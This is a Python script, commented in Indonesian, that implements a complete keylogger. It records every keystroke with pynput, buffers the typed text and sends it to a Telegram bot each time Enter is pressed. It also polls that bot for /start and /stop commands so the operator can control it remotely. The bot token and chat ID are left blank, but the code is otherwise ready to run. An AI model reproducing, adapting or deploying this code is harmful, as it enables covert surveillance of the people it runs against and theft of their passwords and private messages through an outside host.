import logging
from pynput import keyboard
import requests
import time

# Token dan chat_id bot Telegram
TELEGRAM_BOT_TOKEN = ""
CHAT_ID = ""
running = True  # Variabel untuk mengontrol program, setel langsung ke True
buffer = ""  # Buffer untuk menyimpan teks yang diketik
started_message_sent = False  # Menandai apakah pesan "Keylogger started!" sudah dikirim
shift_pressed = False  # Menandai apakah Shift sedang ditekan
last_update_id = None  # Variabel untuk menyimpan ID update terakhir

# Fungsi mengirim log ke Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=payload)

# Fungsi membersihkan buffer updates
def clear_update_buffer():
    global last_update_id
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        response = requests.get(url).json()
        if response.get("result"):
            last_update_id = response["result"][-1]["update_id"]
    except Exception as e:
        print(f"Error clearing update buffer: {e}")

# Fungsi untuk memeriksa perintah dari bot
def check_command():
    global running, started_message_sent, last_update_id
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        params = {"offset": last_update_id + 1} if last_update_id else {}
        response = requests.get(url, params=params).json()

        if response.get("result"):
            for update in response["result"]:
                last_update_id = update["update_id"]  # Perbarui ID terakhir
                message = update["message"].get("text", "")

                if message == "/start" and not started_message_sent:
                    send_to_telegram("Keylogger started!")
                    started_message_sent = True
                elif message == "/stop":
                    running = False
                    send_to_telegram("Keylogger stopped!")
                    started_message_sent = False
                    return False  # Menghentikan program
    except Exception as e:
        print(f"Error: {e}")
    return True

# Fungsi menangkap input keyboard
def on_press(key):
    global buffer, shift_pressed
    if running:
        try:
            if key == keyboard.Key.shift:
                shift_pressed = True

            if hasattr(key, 'char') and key.char is not None:
                buffer += key.char
            elif key == keyboard.Key.space:
                buffer += " "
            elif key == keyboard.Key.enter:
                if not shift_pressed:
                    buffer += "\n"
                    send_to_telegram(buffer)
                    buffer = ""
                else:
                    buffer += "[newline]"
            elif key == keyboard.Key.backspace:
                buffer += "[BACKSPACE]"
            elif key == keyboard.Key.tab:
                buffer += "[TAB]"
            elif key == keyboard.Key.caps_lock:
                buffer += "[CAPSLOCK]"
            elif key == keyboard.Key.alt:
                buffer += "[ALT]"
            elif key == keyboard.Key.ctrl:
                buffer += "[CTRL]"
        except Exception as e:
            print(f"Error processing key: {e}")

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift:
        shift_pressed = False

# Main Program
clear_update_buffer()  # Bersihkan buffer saat program dijalankan
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    send_to_telegram("Keylogger started!")  # Kirim pesan saat program dijalankan
    while True:
        if not check_command():  # Cek perintah dari bot, jika /stop maka berhenti
            listener.stop()
            break
        time.sleep(1)  # Interval pengecekan perintah bot
